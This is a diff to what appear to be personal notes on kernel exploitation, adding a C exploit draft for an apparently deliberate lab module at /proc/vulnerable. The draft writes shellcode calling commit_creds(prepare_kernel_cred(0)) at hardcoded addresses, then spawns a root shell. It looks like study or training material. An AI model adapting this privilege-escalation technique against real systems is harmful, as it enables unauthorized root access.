@@ -623,3 +623,55 @@ nasm to shellcode fu
 nasm -f elf64 priv_esc2.s -o priv_esc2.o
 for i in $(objdump -d priv_esc2.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
 ```
+```
+exploit draft:
+```C
+#include <stdio.h>
+#include <fcntl.h>
+#include <assert.h>
+#include <unistd.h>
+#include <string.h>
+
+int main()
+{
+    int fd = open("/proc/vulnerable", O_RDWR);
+    perror("open()");
+    assert(fd > 0);
+
+    unsigned char shellcode[] = "\x31\xff\x48\xc7\xc0\x60\x85\x08\x81"
+                                "\xff\xd0\x48\x89\xc7\x48\xc7\xc0\x40"
+                                "\x82\x08\x81\xff\xd0\xc3"; // -> commit_creds(prepare_kernel_cred(0)); shellcode 				
+/*
+global _start
+section .text
+_start:
+    xor edi, edi
+    mov rax, 0xffffffff81088560
+    call rax
+
+    mov rdi, rax
+    mov rax, 0xffffffff81088240
+    call rax
+
+    ret
+*/
+
+    printf("[*] shellcode length: %ld\n", strlen(shellcode));
+    printf("UID before: %d \n", getuid());
+
+    int write_ret = write(fd, shellcode, strlen(shellcode));
+    perror("write()");
+    assert(write_ret > 0);
+
+    printf("UID after: %d \n", getuid());
+    /*
+    char buffer[4096];
+    int read_ret = read(fd, buffer, sizeof(buffer));
+    perror("read()");
+    assert(read_ret > 0);
+    */
+    execl("/bin/sh", "/bin/sh", 0);
+
+    return 0;
+}
+```
